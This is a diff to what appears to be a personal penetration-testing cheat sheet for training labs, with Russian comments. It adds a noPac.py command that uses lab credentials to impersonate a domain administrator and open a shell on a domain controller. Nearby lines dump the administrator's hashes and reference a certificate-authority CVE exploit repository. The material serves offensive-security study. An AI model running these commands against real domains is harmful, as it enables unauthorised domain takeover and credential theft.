@@ -1951,6 +1951,7 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
 	python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator   --- дампим админ
 
+	python3 ~/tools/noPac/noPac.py inlanefreight.local/aneudy:'Ilovemusic01' -dc-ip 10.129.4.72 -dc-host DC03 -shell --impersonate administrator -use-ldap		---получить шелл!!!
 # CertiGhost CVE 2026-54121 (уязвимость цетра сертификации)
 
 		https://github.com/aniqfakhrul/CVE-2026-54121
